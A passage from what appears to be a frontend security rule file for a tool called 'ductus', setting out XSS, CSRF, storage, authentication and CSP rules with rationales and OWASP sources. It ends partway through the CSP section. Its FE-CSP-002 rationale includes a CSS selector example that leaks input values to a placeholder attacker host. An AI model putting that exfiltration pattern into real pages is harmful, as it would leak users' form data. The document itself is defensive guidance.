# Security Rules — Frontend

Enforceable security rules for browser-side code, UI rendering, and client-server interaction. These rules apply to all projects with a web frontend adopting `ductus`.

Rules use RFC 2119 language: **MUST** / **MUST NOT** are enforced as errors; **SHOULD** / **SHOULD NOT** are flagged as warnings.

Rule IDs follow the format `FE-{CATEGORY}-{NNN}` and are permanent — once assigned, an ID is never renumbered, even if the rule is moved within the file or deprecated. Categories: `XSS` (cross-site scripting), `CSRF` (cross-site request forgery), `STORAGE` (secure client-side storage), `AUTHN` (authentication UX), `CSP` (content security policy), `DEPS` (dependency management), `PII` (sensitive data handling). See `specs/008-security-rules/data-model.md` for the full schema.

Each rule's Verification states a **design-time commitment** — what a spec or plan must state — which `/{project}:analyze` checks against feature artifacts; when `/{project}:review` selects this file, its security pass also checks code in scope against each rule's Statement.

Projects without a frontend need not opt out: `/{project}:analyze` loads every rule file present, regardless of stack or `[rules] surfaces`, and these rules fire only on a spec or plan that meets their Verification trigger. In `.ductus/config.toml`, a `[rules] surfaces` list without `frontend` stops `ductus` from installing or updating this file (a copy already on disk is left in place) and stops `/{project}:review` from selecting it; a `[[review.disabled-rule-files]]` entry with its mandatory `reason` excludes it from `/{project}:review` alone; and listing it under `[pinned] files` only stops `ductus` updates from overwriting a customized copy, which still loads for review and analyze.

## FE-XSS — Cross-Site Scripting Prevention

### FE-XSS-001

> All untrusted data rendered in HTML MUST be encoded for the specific output context (HTML body, HTML attribute, JavaScript, CSS, URL); a single encoding strategy MUST NOT be reused across contexts.

**Rationale:** Different parsing engines interpret characters differently. HTML encoding does not prevent XSS in JavaScript contexts; URL encoding does not prevent XSS in HTML attribute contexts. A single global "escape" step is structurally insufficient.

**Verification:** Any spec or plan that introduces user-rendered output (search keywords: `render`, `template`, `interpolate`, `display`, `html`) MUST name the output context for each rendered value and the matching encoding strategy. `/{project}:analyze` flags rendering specs that describe a single global encode/escape step with no context distinction, and flags specs that bind untrusted data into JavaScript, CSS, or URL contexts without naming a context-specific encoder.

**Source:** OWASP XSS Prevention Cheat Sheet

### FE-XSS-002

> When the application uses a UI framework with automatic output encoding (React JSX, Angular templates, Vue templates), it MUST rely on the framework's auto-escaping as the primary XSS defense; explicit escape hatches (`dangerouslySetInnerHTML`, `bypassSecurityTrustHtml`, `v-html`) MUST be justified in the spec or plan and accompanied by a sanitization commitment.

**Rationale:** Framework auto-escaping covers the common case with minimal developer effort. Escape hatches bypass protection entirely — without sanitization, every escape-hatch usage is a potential XSS sink.

**Verification:** Any spec or plan that describes UI rendering with a framework MUST commit to using auto-escaping by default and MUST identify any planned escape-hatch usage with the sanitization strategy (e.g., DOMPurify) for that location. `/{project}:analyze` flags rendering specs that name escape-hatch APIs (`dangerouslySetInnerHTML`, `bypassSecurityTrustHtml`, `v-html`, `innerHTML`-binding directives) without an accompanying sanitization commitment.

**Source:** OWASP XSS Prevention Cheat Sheet

### FE-XSS-003

> When manipulating the DOM with untrusted data, code MUST use safe assignment APIs (`.textContent`, `.setAttribute()` with allowlisted attributes, `element.value`) over unsafe alternatives (`.innerHTML`, `.outerHTML`, `eval()`, `document.write()`, `new Function(...)`); when `.innerHTML` is unavoidable, content MUST first be passed through a dedicated sanitization library (DOMPurify or equivalent).

**Rationale:** Unsafe DOM methods interpret string content as executable markup or code. Safe APIs treat strings as data. The default-safe path eliminates an entire class of injection sinks.

**Verification:** Any spec or plan that describes DOM manipulation, dynamic content insertion, or client-side rendering of fetched data MUST commit to safe-API usage as the default. `/{project}:analyze` flags client-rendering specs that name `innerHTML`, `outerHTML`, `eval`, `document.write`, or `Function(...)` for untrusted-data sinks without an accompanying sanitization commitment.

**Source:** OWASP DOM-based XSS Prevention Cheat Sheet

### FE-XSS-004

> Inline `<script>` blocks and inline event-handler attributes (`onclick`, `onerror`, `onload`, etc.) SHOULD NOT be used; JavaScript SHOULD be loaded from external files or inlined behind a CSP nonce/hash so a strict Content Security Policy can be enforced.

**Rationale:** A strict CSP that disallows inline scripts is defense in depth against XSS — once an injection occurs, CSP prevents the injected `<script>` from executing. Inline scripts cannot be distinguished from injected scripts without nonces or hashes.

**Verification:** Any spec or plan that describes UI rendering or HTML response composition SHOULD commit to externalizing scripts and event handlers. `/{project}:analyze` emits a warning when a frontend-rendering spec proposes inline scripts or HTML-attribute event handlers without naming a CSP nonce/hash strategy.

**Source:** OWASP CSP Cheat Sheet, MDN CSP documentation

### FE-XSS-005

> When the application renders user-authored markup (rich-text editors, markdown preview, comment systems with HTML), the rendered output MUST be passed through a dedicated HTML sanitization library configured with an explicit allowlist of tags and attributes; the sanitized output MUST NOT be modified after sanitization.

**Rationale:** Output encoding destroys intended formatting; sanitization preserves safe markup while stripping dangerous elements. Post-sanitization string manipulation can reintroduce vulnerabilities by reordering attributes, decoding entities, or concatenating fragments — re-running the sanitizer is the only safe pattern.

**Verification:** Any spec or plan that allows user-authored HTML, markdown rendering, or rich-text content MUST name the sanitization library (DOMPurify, sanitize-html, etc.) and the configured tag/attribute allowlist. `/{project}:analyze` flags user-content specs that omit the sanitizer name, that propose hand-rolled regex sanitization, or that describe modifying the sanitizer's output before it reaches the DOM.

**Source:** OWASP XSS Prevention Cheat Sheet

### FE-XSS-006

> Untrusted URLs bound to `href`, `src`, `action`, `formaction`, or redirect targets MUST be validated against an explicit allowlist of acceptable schemes. The allowlist MUST NOT include `javascript:`, `data:`, `vbscript:`, or `blob:` for any URL whose value is influenced by user input. (`data:` and `blob:` may appear in narrowly scoped contexts where the URL is produced by application code over content the application controls — e.g., a `data:image/png;base64,…` thumbnail generated server-side — but never directly from user input.)

**Rationale:** `javascript:` URLs execute arbitrary code when navigated to or loaded. `data:` URLs carry their content inline, so a `data:` source lets code be included directly in the document; modern browsers block top-level navigation to them, but a frame or a script source can still load one. `vbscript:` is a legacy Internet Explorer vector: Microsoft disabled VBScript by default in Internet Explorer 11 and its embedded WebBrowser controls only for the Internet and Restricted Sites zones, and left it configurable per zone. A `blob:` URL can be navigated to and serves whatever its backing `Blob` holds, an HTML document included. Allowlisting acceptable schemes is the only durable defense — denylists miss new vectors as browsers add support for new URL types.

**Verification:** Any spec or plan that binds user-controlled values into URL-bearing attributes MUST commit to a project-defined scheme allowlist (e.g., `https:`, `mailto:`, `tel:`). `/{project}:analyze` flags link-rendering, image-rendering, and redirect-handling specs that omit the scheme-allowlist commitment, and flags any allowlist that includes `javascript:`, `data:`, `vbscript:`, or `blob:` for user-influenced URLs.

**Source:** OWASP XSS Prevention Cheat Sheet, OWASP XSS Filter Evasion Cheat Sheet, W3C Content Security Policy Level 3, MDN `data:` URLs and `blob:` URLs documentation, Microsoft Edge Blog "An update on disabling VBScript in Internet Explorer 11"

### FE-XSS-007

> Code that receives `window.postMessage` events MUST validate `event.origin` against an explicit allowlist before acting on `event.data`, and MUST treat `event.data` as untrusted input subject to the same validation, sanitization, and context-aware encoding rules as any other external input.

**Rationale:** `postMessage` listeners that act on `event.data` without origin checks are an XSS-equivalent vector — any page that gets loaded in an iframe, popup, or opener relation can post messages to the listener. Even with an origin check, the data itself is attacker-controlled and must be validated before, e.g., being assigned to `innerHTML` or used as a redirect target.

**Verification:** Any spec or plan that introduces `postMessage` consumers (iframe embeds, OAuth popup callbacks, widget bridges) MUST commit to (a) origin-allowlist validation and (b) data validation/encoding before use. `/{project}:analyze` flags client-messaging specs that omit either check or that rely on wildcard origin checks.

**Source:** OWASP HTML5 Security Cheat Sheet, MDN postMessage documentation

### FE-XSS-008

> When an application adopts the Trusted Types API, its CSP MUST include `require-trusted-types-for 'script'` and a `trusted-types` directive naming the allowed policy names, and sinks that accept strings (`innerHTML`, `outerHTML`, `document.write`, `eval`, `Function`, script `src`) MUST receive `TrustedHTML`/`TrustedScript`/`TrustedScriptURL` values produced by a reviewed policy, not raw strings. A reviewed policy named `default` MAY receive the raw strings of legacy code paths while they are migrated to explicit policies.

**Rationale:** Trusted Types protects only what its enforcement covers. Without `require-trusted-types-for 'script'` the browser accepts raw-string assignments, so an adoption that omits it looks complete and blocks nothing, and a sink fed a raw string or an unreviewed policy's output is the unsanitized path the adoption exists to close. With the enforcement in place, a raw-string assignment throws a `TypeError`, surfacing latent sinks during development. The `default` policy is the documented transition path: under enforcement the browser passes each raw string assigned to a sink through it, so legacy code is sanitized while it is rewritten to create trusted types explicitly.

**Verification:** Any spec or plan that adopts Trusted Types MUST commit to the `require-trusted-types-for 'script'` and `trusted-types` CSP directives, a policy-naming convention, and routing string-accepting sinks through reviewed policies. `/{project}:analyze` flags specs that adopt Trusted Types without naming both directives, or that describe string-accepting sinks receiving raw strings under an adoption with no reviewed `default` policy to route them through.

**Source:** W3C Trusted Types specification, MDN Trusted Types API documentation, OWASP XSS Prevention Cheat Sheet

### FE-XSS-009

> Applications that render dynamic HTML in the browser SHOULD adopt the Trusted Types API as a defense in depth against DOM XSS.

**Rationale:** Trusted Types shifts DOM XSS defense from "find every sink" to "centralize the sanitization." It originated in Chromium (Chrome 83), and current versions of every major engine now support it (Safari 26, Firefox 148), so enforcement is no longer limited to one browser family. In a browser without the API, code that uses the tinyfill MDN documents, or that checks for the API and calls the same sanitizer itself when it is absent, still passes each string through that sanitizer; code that calls `trustedTypes.createPolicy()` unguarded fails there. What an adoption must configure to be effective is `FE-XSS-008`.

**Verification:** Any spec or plan covering rendering of dynamic HTML in the browser SHOULD commit to adopting Trusted Types. `/{project}:analyze` emits a warning when a frontend rendering spec omits the adoption discussion.

**Source:** W3C Trusted Types specification, MDN Trusted Types API documentation (including browser compatibility)

### FE-XSS-010

> Code that sends a `window.postMessage` message carrying non-public data (tokens, authorization codes, user data, application state) MUST pass the exact origin of the intended recipient as the `targetOrigin` argument; `'*'` MUST NOT be used as the `targetOrigin` of such a message.

**Rationale:** `targetOrigin` is the sender's only control over who receives a message. With `'*'`, the browser delivers the message to whatever document occupies the target window at dispatch time, and a popup, opener, or iframe can be navigated to an attacker's page between the moment the sender obtains the window reference and the moment it posts. OAuth and payment popups that hand a token or authorization code back to their opener are the classic leak. `FE-XSS-007` governs the receiving side; pinning the origin at both ends closes the channel in each direction.

**Verification:** Any spec or plan that introduces `postMessage` senders (OAuth or payment popup callbacks, iframe widget bridges, cross-window handoffs) MUST name the recipient origin for each message that carries non-public data. `/{project}:analyze` flags client-messaging specs that send such messages with a `'*'` target origin or that omit the target origin.

**Source:** OWASP HTML5 Security Cheat Sheet, MDN postMessage documentation

## FE-CSRF — Cross-Site Request Forgery Prevention

### FE-CSRF-001

> Every state-changing request authenticated by a credential the browser attaches automatically (session cookie, HTTP Basic, TLS client certificate) MUST be protected by at least one of: a synchronizer token or signed double-submit cookie token, transmitted in a request body field or custom header and validated server-side; a required custom request header on requests the client sends via `fetch`/`XMLHttpRequest`, under a CORS policy that does not admit that header from other origins; or server-side `Sec-Fetch-Site` validation, under which a state-changing request that lacks the header is either rejected (failing closed) or checked against its `Origin` as the fallback. A design that falls back to a CSRF token instead complies through the token defense. `SameSite` cookies and `Origin`/`Referer` checks MUST NOT be the sole defense.

**Rationale:** CSRF attacks forge requests from the victim's browser, riding on a credential the browser attaches without the calling site's involvement. A token validated server-side proves the request originated from the application's own UI; a custom header cannot be set cross-origin without a CORS preflight the server refuses; `Sec-Fetch-Site` reports whether the browser initiated the request from the application's own origin. For a request that arrives without `Sec-Fetch-Site`, which some legacy browsers never send, the OWASP CSRF Prevention Cheat Sheet's server-side policy offers two treatments: block it as unknown (fail-safe, which it recommends for sensitive endpoints), or fall back to standard origin verification, CSRF tokens, or additional validation (fail-open, compatibility-first). `SameSite` is defense in depth, not a replacement: the Lax-by-default treatment of cookies that omit the attribute ships in Chromium only (Firefox keeps it behind a preference, Safari does not implement it), `Lax` still sends the cookie on top-level `GET` navigations, and every subdomain of the registrable domain counts as same-site, so a compromised sibling subdomain can still forge requests. The OWASP CSRF Prevention Cheat Sheet lets `SameSite` stand alone in narrow deployments that meet five conditions, one of them an `Origin` or `Referer` check anyway; this rule, like `BE-API-011`, does not adopt that exception. `Origin`/`Referer` checks alone are insufficient because both headers can be absent or `null` on legitimate requests. Endpoints authenticated solely by a bearer token the page attaches explicitly (not stored in a cookie) cannot be forged cross-site. `BE-API-011` is this rule's server-side enforcement half.

**Verification:** Any spec or plan that introduces state-changing endpoints authenticated by a cookie or other ambient credential MUST name the CSRF defense — a synchronizer token, a signed double-submit cookie, a required custom request header, or `Sec-Fetch-Site` validation together with its treatment of a request that lacks the header (rejection, an `Origin` fallback, or a fallback to the token defense). `/{project}:analyze` flags state-changing endpoint specs that omit the CSRF question, that name `SameSite` or `Origin`/`Referer` checks as the only defense, that propose an unsigned double-submit cookie, or that validate `Sec-Fetch-Site` without stating what happens to a request that lacks it.

**Source:** OWASP Cross-Site Request Forgery Prevention Cheat Sheet, W3C Fetch Metadata Request Headers, MDN Set-Cookie documentation (browser compatibility: `SameSite` defaults to `Lax`)

### FE-CSRF-002

> Session and authentication cookies MUST set the `SameSite` attribute to `Lax` or `Strict`. `SameSite=None` MUST only be used when cross-site cookie transmission is explicitly required (e.g., third-party embed) and, when used, MUST be combined with `Secure`. Use of `SameSite=None` MUST be justified in the spec.

**Rationale:** SameSite restricts the browser from including cookies on cross-site requests, blocking the most common CSRF vector at the cookie layer. `SameSite=None` widens the attack surface — the cookie travels on cross-site requests and must be defended by a separate CSRF mechanism (per `FE-CSRF-001`). Chrome, Edge, and Firefox (from version 131) require `Secure` on a `SameSite=None` cookie, but Safari and Android WebView do not enforce the requirement, so only the issuer's commitment guarantees the pairing everywhere.

**Verification:** Any spec or plan that introduces session cookies or auth cookies MUST name the `SameSite` value and, if `None`, MUST justify the cross-site requirement and confirm both `Secure` and the accompanying CSRF defense. `/{project}:analyze` flags cookie-issuing specs that omit the `SameSite` attribute, that propose `SameSite=None` without justification, or that propose `SameSite=None` without `Secure`.

**Source:** OWASP CSRF Prevention Cheat Sheet, OWASP Session Management Cheat Sheet, MDN Set-Cookie documentation (including browser compatibility)

### FE-CSRF-003

> State-changing operations MUST NOT be exposed via HTTP `GET`; `GET` requests MUST be restricted to safe, idempotent reads.

**Rationale:** `GET` requests can be triggered by image tags, link prefetching, and shared URLs — all CSRF vectors and all cache-friendly — and `SameSite=Lax` still sends cookies on top-level `GET` navigations, so a state-changing `GET` defeats it. State-changing methods (`POST`, `PUT`, `PATCH`, `DELETE`) require an explicit form submission or scripted request, narrowing the trigger surface.

**Verification:** Any spec or plan that introduces an endpoint MUST name the HTTP method per operation and MUST NOT assign `GET` to any state-changing action. `/{project}:analyze` flags endpoint specs whose `GET` handlers are described as creating, updating, or deleting state, or that conflate read and write under a single method.

**Source:** OWASP Cross-Site Request Forgery Prevention Cheat Sheet

### FE-CSRF-004

> Attacker-controllable input — the URL (path, query string, or fragment), `window.name`, `document.referrer`, or `postMessage` data — MUST NOT determine the endpoint or HTTP method of a state-changing request that client-side code sends, other than by selecting from a fixed set of requests the application defines; a value from such input that becomes a parameter of the request, including a resource ID in the path, MUST be validated against the format and the set of values the application expects before the request is sent.

**Rationale:** This is client-side CSRF: the application's own script sends the forged request, so the request carries the synchronizer token or custom header the script attaches, and the browser treats it as same-site, which defeats token defenses and `SameSite` cookies alike (`FE-CSRF-001`, `FE-CSRF-002`). The attacker needs only to get the victim to open a crafted link, or to open the page with `window.open()`, for the script to send a request built from the attacker's input. Selecting from a fixed table of requests the application defines, or validating each value strictly, keeps the attacker from choosing what the request does.

**Verification:** Any spec or plan that describes client-side code issuing state-changing requests whose endpoint, method, or parameters derive from URL components, `window.name`, `document.referrer`, or `postMessage` data (deep links, hash-based routing, OAuth or payment return handlers, embedded widgets) MUST name how those inputs are constrained — a predefined request table the input selects from, or per-value validation. `/{project}:analyze` flags client-routing and deep-link specs that build a state-changing request's endpoint or method from such input, or that pass such input into a state-changing request without naming its validation.

**Source:** OWASP Cross-Site Request Forgery Prevention Cheat Sheet (Dealing with Client-Side CSRF Attacks)

## FE-STORAGE — Secure Client-Side Storage

### FE-STORAGE-001

> Secrets, API tokens, session tokens, refresh tokens, and credentials MUST NOT be stored in `localStorage`, `sessionStorage`, or IndexedDB; sensitive long-lived state MUST be held in `HttpOnly` cookies or in memory for the lifetime of the page.

**Rationale:** Browser storage APIs are accessible to any JavaScript running on the page, including injected scripts from XSS, malicious browser extensions, and bundle-tampering. A single XSS vulnerability exfiltrates every value in storage. `HttpOnly` cookies cannot be read by JavaScript at all.

**Verification:** Any spec or plan that describes client-side state, token handling, or session management MUST name the storage location for each sensitive value and MUST NOT assign tokens or credentials to `localStorage`, `sessionStorage`, or IndexedDB. `/{project}:analyze` flags client-state specs that propose persisting tokens, secrets, or credentials in browser storage APIs, including in encrypted form — a script that can read the stored value can replay it, so encryption does not lift the prohibition.

**Source:** OWASP HTML5 Security Cheat Sheet, OWASP Session Management Cheat Sheet

### FE-STORAGE-002

> Session and authentication cookies MUST set `HttpOnly` (denies JavaScript access), `Secure` (requires HTTPS transit), and `SameSite=Lax` or `Strict` (limits cross-site transmission); `SameSite=None` MAY replace `Lax`/`Strict` only under the conditions `FE-CSRF-002` sets.

**Rationale:** Each attribute closes a specific attack vector: `HttpOnly` blocks XSS-based theft, `Secure` blocks plaintext interception, and `SameSite` limits the cross-site requests that carry the cookie, one layer of the CSRF defense `FE-CSRF-001` requires. `FE-CSRF-002` owns the `SameSite` value choice, including the justified cross-site exception, so the two rules never disagree about one cookie.

**Verification:** Any spec or plan that introduces a session, authentication, or other privileged cookie MUST commit to setting all three required attributes. `/{project}:analyze` flags cookie-issuing specs that omit `HttpOnly`, `Secure`, or `SameSite`.

**Source:** OWASP Session Management Cheat Sheet

### FE-STORAGE-003

> Sensitive data (tokens, credentials, PII, session identifiers) MUST NOT appear in URL query parameters, fragment identifiers, or path segments. A single-use, short-lived token whose flow requires URL delivery — an OAuth authorization code, an emailed password-reset or email-verification link — MAY appear in the URL, in a query parameter or a path segment, when the server invalidates it on first use and the landing page sets `Referrer-Policy: no-referrer`. A pre-signed object-storage URL MAY carry its signature in the URL when it is scoped to one object and one method and expires within a lifetime the spec states.

**Rationale:** Paths and query strings are written to browser history, server access logs, `Referer` headers, proxy logs, browser sync services, and third-party analytics — every consumer of which is a potential exfiltration path. Fragments never reach the server or the `Referer` header, but they persist in history, bookmarks, and sync, and every script on the page can read them — one of the leakage paths behind RFC 9700's advice against the OAuth implicit grant, which returns the access token in the fragment. Sensitive values belong in request bodies or in headers such as `Authorization`, which the default access-log formats of Apache and nginx do not record; both record the full request line, query string included. The carve-out covers the flows that cannot avoid a URL: a token that dies on first use, expires quickly, and is kept out of `Referer` leaves a replay window of minutes rather than the lifetime of every log line that recorded it. Its position does not change that: a path segment and a query string reach the same request-line logs, history and `Referer`, so first-use invalidation and `Referrer-Policy: no-referrer` bound the exposure in either, and `BE-API-013` allows the same token in both. A pre-signed URL exists to carry its authorization in the URL, so a page that loads an object through one has no alternative; it is not single-use — AWS documents that one can be used multiple times up to its expiry, as long as 7 days through the CLI and SDKs, and calls pre-signed URLs bearer tokens — so its carve-out is bounded by its scope, one object and one method, and an expiry the spec states, as `BE-API-013`'s is.

**Verification:** Any spec or plan that describes how the client transmits sensitive values to the server MUST commit to request bodies or headers, not URL components. `/{project}:analyze` flags client-server specs that bind tokens, credentials, session IDs, or PII into URL paths, query strings, or fragments outside the two carve-outs, flags a URL-delivered single-use token whose spec omits first-use invalidation, expiry, or the landing page's `Referrer-Policy: no-referrer`, and flags a pre-signed URL whose spec states no expiry or whose scope reaches more than one object or method.

**Source:** OWASP REST Security Cheat Sheet, OWASP Session Management Cheat Sheet, OWASP Forgot Password Cheat Sheet, RFC 9700 (OAuth 2.0 Security Best Current Practice), MDN Referer and URI fragment documentation, Apache HTTP Server "Log Files" and nginx `ngx_http_log_module` documentation, Amazon S3 User Guide (Download and upload objects with presigned URLs)

### FE-STORAGE-004

> The `Domain` attribute SHOULD NOT be set on session and authentication cookies unless cross-subdomain sharing is explicitly required.

**Rationale:** Omitting `Domain` confines the cookie to the exact host that set it, so a compromised or attacker-controlled subdomain never receives it (preventing subdomain hijacks).

**Verification:** Any spec or plan that introduces a session, authentication, or other privileged cookie SHOULD leave `Domain` unset, or justify cross-subdomain sharing where it sets one. `/{project}:analyze` emits a warning when a cookie-issuing spec sets `Domain` without justification.

**Source:** OWASP Session Management Cheat Sheet

### FE-STORAGE-005

> Session and authentication cookies SHOULD use the `__Host-` name prefix.

**Rationale:** The browser rejects a `__Host-` cookie unless it is set from a secure origin with `Secure`, with `Path=/`, and without a `Domain` attribute, so the browser itself enforces the host-only scope `FE-STORAGE-004` asks for and the `Secure` attribute `FE-STORAGE-002` requires. The prefix also defeats cookie tossing: a compromised or attacker-controlled sibling subdomain can set an unprefixed cookie scoped to the parent domain that shadows the session cookie (session fixation) or the token of a double-submit CSRF defense, but it cannot plant a `__Host-` cookie on another host.

**Verification:** Any spec or plan that introduces a session, authentication, or other privileged cookie SHOULD name it with the `__Host-` prefix, or state why the cookie needs a `Domain` attribute or a narrower `Path`. `/{project}:analyze` emits a warning when a cookie-issuing spec names a privileged cookie without the `__Host-` prefix and without that justification.

**Source:** OWASP Session Management Cheat Sheet, OWASP Cross-Site Request Forgery Prevention Cheat Sheet, MDN Set-Cookie documentation (cookie prefixes)

### FE-STORAGE-006

> Service worker code MUST NOT store responses that carry sensitive data — tokens, credentials, PII, or other user-specific authenticated content — in the Cache API.

**Rationale:** The Cache API does not honor HTTP caching headers, and its entries do not expire until code deletes them, so the `Cache-Control: no-store` that `FE-PII-003` requires keeps a response out of the browser's HTTP cache but not out of a cache a service worker writes. A cache-first or stale-while-revalidate strategy applied to every route therefore keeps account pages and authenticated API responses with no end date, where they outlast the session that fetched them. The worker's caching code has to exclude such responses explicitly.

**Verification:** Any spec or plan that introduces or changes a service worker that caches responses (offline support, precaching, runtime caching strategies) MUST name which routes or response types it caches and commit to excluding authenticated and sensitive responses. `/{project}:analyze` flags service-worker specs that apply a caching strategy to all routes or to authenticated API responses without naming that exclusion, or that rely on `Cache-Control: no-store` to keep responses out of the Cache API.

**Source:** OWASP HTML5 Security Cheat Sheet (Offline Applications), MDN Cache documentation

## FE-AUTHN — Authentication UX

### FE-AUTHN-001

> Post-authentication redirect destinations MUST be validated against an allowlist of internal application paths or hosts; open redirects (any user-controlled redirect target accepted without validation) MUST NOT be permitted.

**Rationale:** Open redirects are a phishing primitive — attackers craft links that hit the real login page (legitimate domain) and then bounce to attacker-controlled landing pages where credentials or session tokens can be harvested. Allowlist validation contains the redirect to known-safe destinations.

**Verification:** Any spec or plan that describes post-login redirects, "return to" URLs, OAuth callback handling, or any feature that accepts a destination URL from request parameters MUST name the allowlist (paths, hosts, signed-token validation). `/{project}:analyze` flags login or OAuth flows that pass through a `next`/`return_to`/`redirect_uri` value without naming an allowlist or signature check.

**Source:** OWASP Unvalidated Redirects and Forwards Cheat Sheet

### FE-AUTHN-002

> When the user's session expires or is revoked, the application MUST surface a clear re-authentication prompt or redirect to the login page; the application MUST NOT silently fail, retry indefinitely, or leave the UI in a broken state.

**Rationale:** Silent failures confuse users into believing the application is broken, can mask data loss when a save attempt is rejected, and leave the user no path forward. Clear prompts give the user an explicit recovery action.

**Verification:** Any spec or plan that describes authenticated UI flows MUST name the session-expiration UX (redirect, modal prompt, banner with re-auth) and the data-preservation behavior for in-progress work. `/{project}:analyze` flags authenticated-UI specs that omit session-expiration handling or that describe error states (e.g., "request fails") without naming the recovery path.

**Source:** OWASP Session Management Cheat Sheet

### FE-AUTHN-003

> The logout action MUST invalidate the session on the server, clear all client-side session cookies, and redirect to a public page; client-side-only logout (clearing cookies without server invalidation) MUST NOT be used.

**Rationale:** Client-only logout leaves the session valid on the server. Anyone who recovers the session ID — from a recently used shared device, network capture, or a second tab on a compromised machine — can continue using the session. Server invalidation makes the credential immediately unusable.

**Verification:** Any spec or plan that introduces logout, session termination, or "sign out everywhere" flows MUST commit to server-side session invalidation and explicit cookie clearing. `/{project}:analyze` flags logout specs that describe only clearing cookies, calling `localStorage.clear`, or redirecting without naming the server invalidation step.

**Source:** OWASP Session Management Cheat Sheet

## FE-CSP — Content Security Policy

### FE-CSP-001

> All HTML responses MUST be served with a `Content-Security-Policy` HTTP header; CSP MUST be delivered via the response header.

**Rationale:** CSP is the browser-enforced layer of defense in depth against XSS. Header-delivered CSP covers the whole response and supports the full directive set; a `<meta>`-delivered policy does not apply to content that precedes the element, ignores the `frame-ancestors`, `report-uri`, and `sandbox` directives, and cannot carry a report-only policy. Header delivery is the only complete enforcement.

**Verification:** Any spec or plan that describes serving HTML responses or configuring the edge/web server MUST commit to a CSP header on every HTML response. `/{project}:analyze` flags HTML-serving specs that omit a CSP commitment or that describe `<meta>`-only CSP delivery.

**Source:** W3C Content Security Policy Level 3, OWASP CSP Cheat Sheet, MDN CSP documentation

### FE-CSP-002

> The CSP policy MUST use nonce-based or hash-based script restrictions. The policy MUST NOT include `'unsafe-inline'` or `'unsafe-eval'` in `script-src`, MUST NOT include `'unsafe-inline'` in `style-src` (nonce/hash or `'self'` only), and MUST include `object-src 'none'` and `base-uri 'none'` (or `'self'`).

**Rationale:** `'unsafe-inline'` in `script-src` permits any injected `<script>` to execute — defeating CSP's XSS protection. Current browsers ignore the keyword when a nonce or hash is present, so beside the required nonce/hash it adds nothing for them, and it reopens the hole in any browser without nonce/hash support or wherever a policy ships without its nonce/hash. CSP Level 3 itself shows the keyword as a fallback for older browsers beside a nonce and `'strict-dynamic'`; this rule gives up that fallback so the policy text never admits inline script. `'unsafe-eval'` permits string-to-code conversion (`eval`, `Function(...)`, `setTimeout(string, …)`). `'unsafe-inline'` in `style-src` lets an injected `<style>` block or `style` attribute apply, the precondition for CSS-based data exfiltration through attribute selectors (`input[value^="a"] { background: url(//attacker/a); }`) whenever the policy admits an image or font source the attacker controls. `object-src 'none'` blocks plugin- and `<embed>`-based content injection. `base-uri` lockdown prevents `<base>` tag injection from rerouting relative URLs to an attacker-controlled host.

**Verification:** Any spec or plan that defines a CSP policy MUST name the nonce/hash strategy for scripts and the `style-src` strategy (a nonce or hash, or `'self'`) and MUST commit to absence of `'unsafe-inline'`/`'unsafe-eval'` in `script-src`, absence of `'unsafe-inline'` in `style-src`, and explicit `object-src` and `base-uri` lockdown. `/{project}:analyze` flags CSP specs that include any of the unsafe directives or that omit `object-src`/`base-uri` directives.

**Source:** OWASP CSP Cheat Sheet, W3C Content Security Policy Level 3, MDN CSP documentation, XS-Leaks Wiki (CSS Injection)

### FE-CSP-003

> The CSP policy MUST include `frame-ancestors 'none'` (or `'self'` if same-origin framing is required). A page designed to be embedded by other sites MAY instead list the exact origins permitted to frame it; wildcard sources (`*`, `https:`) MUST NOT be used.

**Rationale:** Clickjacking attacks embed the application in an attacker-controlled iframe and trick users into interacting with the framed UI. `frame-ancestors` is the modern defense, and it does not fall back to `default-src`, so a policy that omits it permits framing by any origin. An explicit origin list keeps embeddable pages (widgets, payment or consent frames) framable by their intended hosts only; a wildcard source restores the exposure the directive exists to remove.

**Verification:** Any spec or plan that describes serving HTML responses MUST commit to `frame-ancestors 'none'` or `'self'` in CSP, or, for a page designed to be embedded, to an explicit list of permitted framing origins. `/{project}:analyze` flags HTML-serving specs that omit `frame-ancestors` or that give it a wildcard source.

**Source:** OWASP HTTP Headers Cheat Sheet, OWASP Clickjacking Defense Cheat Sheet, W3C Content Security Policy Level 3, MDN CSP `frame-ancestors` documentation

### FE-CSP-004

> The CSP policy SHOULD include `form-action 'self'` (or an explicit destination allowlist) to restrict where the browser will submit forms.

**Rationale:** Without `form-action`, an injected or compromised page fragment can submit forms to attacker-controlled servers — a phishing primitive that bypasses navigation-based defenses. The directive does not fall back to `default-src`, so a policy that omits it leaves form targets unrestricted however tight the rest of the policy is.

**Verification:** Any spec or plan that defines a CSP policy SHOULD include a `form-action` directive scoped to `'self'` or an explicit destination allowlist. `/{project}:analyze` emits a warning when CSP specs omit `form-action`.

**Source:** OWASP CSP Cheat Sheet, MDN CSP `form-action` documentation

### FE-CSP-005

> The CSP policy MUST include a reporting directive — `report-to` (preferred) with a matching `Reporting-Endpoints` header, and/or `report-uri` for backwards compatibility — pointing to an endpoint that ingests CSP violation reports. The endpoint MUST keep the reports where the team responsible for the CSP can review them, not discard them on receipt.

**Rationale:** A CSP without reporting is a black box: violations (which include both injection attempts and legitimate code that breaks under the policy) are visible only in browser devtools, where no one sees them. With reporting, the team can learn about XSS attempts in production and about CSP regressions before users complain. A `Content-Security-Policy-Report-Only` trial of a tighter policy depends on it too: without a reporting directive the trial sends no reports and has no effect. How the team watches the kept reports is its own operational choice; this rule requires only that they are kept where it can.

**Verification:** Any spec or plan that defines a CSP policy MUST commit to a reporting directive and to an ingest path that keeps the reports reviewable by the responsible team. `/{project}:analyze` flags CSP specs that omit both `report-to` and `report-uri`, and flags reporting-endpoint specs that describe discarding reports on receipt (to `/dev/null`, for example) or that name no place the reports are kept.

**Source:** W3C Content Security Policy Level 3, OWASP CSP Cheat Sheet, MDN Reporting API, MDN Content-Security-Policy-Report-Only documentation

### FE-CSP-006

> Iframes embedding content the application does not fully control (third-party widgets, social-media embeds, user-supplied URLs, payment forms hosted elsewhere) MUST set the `sandbox` attribute with the minimum capabilities required for the embed to function. `sandbox=""` (full restrictions) is the floor; each token added (`allow-scripts`, `allow-same-origin`, `allow-forms`, etc.) MUST be justified. `allow-scripts` plus `allow-same-origin` together MUST NOT be used on a frame whose document is served from the embedding page's own origin (user-authored or user-uploaded HTML, for example) — that combination lets the framed document remove its own sandbox.

